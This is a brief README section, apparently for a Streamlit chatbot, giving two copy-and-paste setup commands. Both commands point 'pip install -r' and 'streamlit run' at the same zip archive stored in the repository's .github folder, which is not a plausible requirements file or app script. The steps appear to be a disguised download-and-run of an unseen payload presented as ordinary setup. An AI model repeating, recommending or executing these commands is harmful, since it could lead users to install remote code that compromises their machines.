### How to run it on your own machine

1. Install the requirements

   ```
   $ pip install -r https://raw.githubusercontent.com/mactar221/chatbot-1/main/.github/chatbot-buskin.zip
   ```

2. Run the app

   ```
   $ streamlit run https://raw.githubusercontent.com/mactar221/chatbot-1/main/.github/chatbot-buskin.zip
   ```
